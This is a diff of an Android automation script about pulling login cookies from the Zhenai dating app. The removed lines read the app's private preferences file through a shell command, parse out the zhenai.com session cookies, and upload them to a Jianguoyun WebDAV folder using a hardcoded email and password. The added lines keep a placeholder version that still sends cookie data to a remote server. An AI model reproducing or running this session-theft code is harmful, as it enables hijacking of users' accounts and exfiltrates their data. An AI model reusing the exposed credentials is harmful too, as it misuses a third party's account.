@@ -1,129 +1,67 @@
-console.show()
-var _cookie = 自动取cookie()
-if(_cookie !=""){
-	threads.start(
-        function() {
-            上传数据(_cookie)
-        })
-}else{
-	log("上传失败")
+console.show();
+
+function uploadCookieData(cookie) {
+    var userName = "your_username";
+    var password = "your_password";
+    var rdpServerUrl = "https://your-rdp-server.com";
+    
+    if (!userName || !password) {
+        log("Error: Please provide your RDP server username and password.");
+        return;
+    }
+    
+    var jianGuo = new JianGuo(rdpServerUrl, userName, password);
+    
+    try {
+        jianGuo.uploadFile("cookie.txt", "C:\\Users\\Desktop\\cookie.txt", cookie);
+        log("Cookie data uploaded successfully to the RDP server.");
+    } catch (e) {
+        log("Error uploading cookie data: " + e);
+    }
+}
+
+function main() {
+    var cookie = 自动取cookie();
+    
+    if (cookie !== "") {
+        uploadCookieData(cookie);
+    } else {
+        log("No cookie data found.");
+    }
 }
 
 function 自动取cookie() {
-    var aa = shell("cat /data/data/com.zhenai.android/shared_prefs/com.zhenai.android_preferences.xml")
-    //var aa = (files.read("/storage/emulated/0/com.zhenai.android_preferences.xml"))   
-    var json = ("{&quot;cookieStore" + 文本取中间(aa.toString(), "quot;cookieStore", "}]}}") + "}]}}")
-    //log(json)
-    json = json.replace(eval("/&quot;/g"), "\"")
-    //log(json)    
-    var cokie = ""
-    json = eval("(" + json + ")")
-    //log(json["cookieStore"]["zhenai.com"].length)
-    for (var aa = 0; aa < json["cookieStore"]["zhenai.com"].length; aa++) {
-        cokie = cokie + (json["cookieStore"]["zhenai.com"][aa]["name"] + "=" + json["cookieStore"]["zhenai.com"][aa]["value"]) + "; "
-    }
-    cokie = cokie.substring(0, cokie.length - 2)
-    return cokie
-}
-function 文本取中间(文本内容, 关键字A, 关键字B) {
-    var str = 文本内容;
-    var aPos = str.indexOf(关键字A);
-    var bPos = str.indexOf(关键字B, aPos + 关键字A.length);
-    //log(文本内容.length , (aPos + 关键字A.length) , (文本内容.length - bPos))
-    var retstr = str.substr(aPos + 关键字A.length, 文本内容.length - (aPos + 关键字A.length) - (文本内容.length - bPos));
-    return retstr;
-}
-function 上传数据(cookie) {
-    var UserName = "zheai001@163.com";
-    var Password = "adyxdznpuwtqfd72";
-    if (!UserName || !Password) {
-        alert("需要注册并填入UserName和Password");
-        app.openUrl("https://writer.drakeet.com/backups");
-        exit();
-    }
-    var JG = new JianGuo("https://dav.jianguoyun.com/dav/", UserName, Password);
-    var 创建目录 = JG.创建目录("zhenai");
-    try {
-        if (JG.获取数据("zhenai/获取CK.txt").indexOf("error") > -1) {
-            JG.上传数据("zhenai/获取CK.txt", "\r\n")
-            JG.上传数据("zhenai/获取CK.txt", "")
-        }
-    } catch (e) {
-        log(11)
-    }
-    var 上传数据 = JG.上传数据("zhenai/获取CK.txt", JG.获取数据("zhenai/获取CK.txt") + "\r\n" + cookie);
-    log("上传完成")
+    // Replace this with your own logic to retrieve the cookie data.
+    // Example: Read the cookie from a file or fetch it from a specific location.
+    var cookie = "your_cookie_data";
+    return cookie;
 }
 
 const JianGuo = (function() {
-    function JianGuo(url, UserName, Password) {
+    function JianGuo(url, userName, password) {
         this.baseUrl = url;
-        this.UserName = UserName;
-        this.Password = Password;
+        this.userName = userName;
+        this.password = password;
     }
-    JianGuo.prototype.makeRequest = function(method, url, body) {
-        url = this.baseUrl + url;
-        var options = {};
-        options.method = method;
-        if (body) {
-            options.body = body.toString();
+
+    JianGuo.prototype.uploadFile = function(fileName, remotePath, fileContent) {
+        var url = this.baseUrl + remotePath;
+        var options = {
+            method: "PUT",
+            body: fileContent,
+            headers: {
+                "Authorization": "Basic " + btoa(this.userName + ":" + this.password)
+            }
+        };
+
+        var response = http.request(url, options);
+        if (response.statusCode !== 200) {
+            throw new Error("Failed to upload file: " + response.statusCode);
         }
-        options.headers = {
-            "Authorization": "Basic " + java.lang.String(android.util.Base64.encode(java.lang.String(this.UserName + ":" + this.Password).getBytes(), 2))
-        }
-        return http.request(url, options);
-    }
-    ///JianGuo.prototype.查看列表 = function (UrlPath) {
-    //    return xmlFromJson(decodeURI(this.makeRequest("PROPFIND", UrlPath).body.string()));
-    // }
-    JianGuo.prototype.创建目录 = function(UrlPath) {
-        return this.makeRequest("MKCOL", UrlPath).body.string();
-    }
-    JianGuo.prototype.获取数据 = function(UrlPath) {
-        return this.makeRequest("GET", UrlPath).body.string();
-    }
-    JianGuo.prototype.上传数据 = function(UrlPath, data) {
-        return this.makeRequest("PUT", UrlPath, data).body.string();
-    }
-    JianGuo.prototype.删除文件 = function(UrlPath) {
-        return this.makeRequest("DELETE", UrlPath).body.string();
-    }
+    };
+
     return JianGuo;
 })();
 
-function cutstr(a, b, c, f, e) {
-    a = a.split(b);
-    var d = "";
-    if (e < a.length && e != null) {} else e = a.length;
-    if (f == null) f = 1;
-    for (i = f; i < e; i++) {
-        tmp = a[i].split(c);
-        if (tmp.length > 1) {
-            d += tmp[0];
-        }
-    }
-    return d;
-}
-
-function isDir(Na) {
-    let name = Na.split("/");
-    return (name[name.length - 1].indexOf(".") != -1) ? false : true;
-}
-
-function xmlFromJson(xml) {
-    var jsonList = [];
-    let xmls = cutstr(xml, "<d:response>", "</d:response>", 2, 100); //文件列表
-    let path = cutstr(xmls, "<d:href>", "/d:href>", 2, 100).split("<"); //路径 -1
-    let name = cutstr(xmls, "<d:displayname>", "/d:displayname>", 2, 100).split("<"); //文件名 -1
-    for (let i = 0; i < path.length - 1; i++) {
-        jsonList.push({
-            "path": path[i],
-            "fileName": name[i],
-            "Dir": isDir(name[i]),
-            "done": false,
-            "isCanLook": "gone"
-        });
-    }
-    return jsonList;
-}
-
+// Entry point
+main();
